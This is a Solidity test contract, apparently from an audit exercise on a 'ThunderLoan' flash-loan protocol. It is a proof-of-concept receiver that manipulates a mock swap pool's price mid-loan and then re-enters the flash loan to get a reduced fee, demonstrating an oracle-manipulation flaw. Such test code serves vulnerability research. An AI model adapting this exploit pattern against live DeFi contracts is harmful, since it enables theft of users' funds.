// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../../src/interfaces/IFlashLoanReceiver.sol";
import { IThunderLoan } from "../../../src/interfaces/IThunderLoan.sol";
import { ThunderLoan } from "src/protocol/ThunderLoan.sol";
import { BuffMockTSwap } from "test/mocks/BuffMockTSwap.sol";
import { console } from "forge-std/console.sol";

contract OracleFlashLoanReceiver is IFlashLoanReceiver {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;

    ThunderLoan s_thunderLoan;
    BuffMockTSwap s_pool;
    address repayAddress;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    bool attack;

    uint256 public fee1;
    uint256 public fee2;

    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;

    // token address
    address tokenA;
    address weth;

    constructor(address thunderLoan, address Pool, address _weth, address repay) {
        s_owner = msg.sender;
        s_thunderLoan = ThunderLoan(thunderLoan);
        weth = _weth;
        s_pool = BuffMockTSwap(Pool);
        repayAddress = repay;
        s_balanceDuringFlashLoan = 0;
        attack = false;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        if (!attack) {
            fee1 = fee;
            attack = true;
            uint256 expectedOutputWeth = s_pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(s_pool), 50e18);
            s_pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expectedOutputWeth, block.timestamp);

            // then we re enter the function flashloan, in order to go to the else branch of the if-else statement
            s_thunderLoan.flashloan(address(this), IERC20(token), amount, "");
        } else {
            fee2 = fee;
            // IERC20(token).approve(address(s_thunderLoan), amount + fee1);
            // s_thunderLoan.repay(IERC20(token), amount + fee1);

            // repay the flash loan twice in  here.
            IERC20(token).transfer(address(repayAddress), amount * 2 + fee1 + fee2);
        }

        return true;
    }

    function getBalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}
